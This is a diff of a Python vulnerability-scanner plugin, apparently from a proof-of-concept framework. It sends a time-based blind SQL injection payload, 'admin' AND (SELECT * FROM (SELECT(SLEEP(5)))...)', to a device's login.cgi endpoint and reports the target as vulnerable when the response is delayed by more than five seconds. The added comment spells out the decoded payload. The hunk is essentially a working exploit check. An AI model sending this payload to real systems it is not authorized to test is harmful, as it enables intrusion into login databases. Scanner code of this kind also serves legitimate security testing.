@@ -43,16 +43,13 @@ class P(T):
         true_time=time.time()-start_time1
         #print true_time
         start_time2=time.time()
+#	login.cgi?act=login&user_name=admin' AND (SELECT * FROM (SELECT(SLEEP(5)))HcCu) AND 'zMcG'='zMcG&user_pwd=admin&lang=zh_CN.UTF-8&t=0.9077004473656416&loginflag=1&ajax_rnd=01533054909668862846&user_name=[object HTMLInputElement]&session_id=undefined&lang=[object HTMLSelectElement]
         payload="login.cgi?act=login&user_name=admin%27%20AND%20(SELECT%20*%20FROM%20(SELECT(SLEEP(5)))HcCu)%20AND%20%27zMcG%27=%27zMcG&user_pwd=admin&lang=zh_CN.UTF-8&t=0.9077004473656416&loginflag=1&ajax_rnd=01533054909668862846&user_name=[object%20HTMLInputElement]&session_id=undefined&lang=[object%20HTMLSelectElement]"
         target = arg + payload
         code2, head, res, errcode, _ = curl.curl2(target)
         flase_time=time.time()-start_time2
         if code1==200 and code2==200 and true_time<2 and flase_time>5:
             output(target,result,'hole')
-        
-    
-        
-    
 
         del curl
         return result
